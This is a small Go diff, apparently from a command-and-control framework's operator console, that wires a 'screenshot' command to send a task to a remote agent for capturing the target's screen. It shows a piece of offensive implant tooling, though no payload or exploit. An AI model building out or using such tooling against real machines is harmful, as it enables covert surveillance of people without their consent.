@@ -213,7 +213,7 @@ func RegisterNewCommands(c *grumble.Context, agentid string) {
 		Name: "screenshot",
 		Help: "capture a screenshot of target",
 		Run: func(c *grumble.Context) error {
-			return nil
+			return SendTask(agentid, "screenshot", "")
 		},
 	})
 
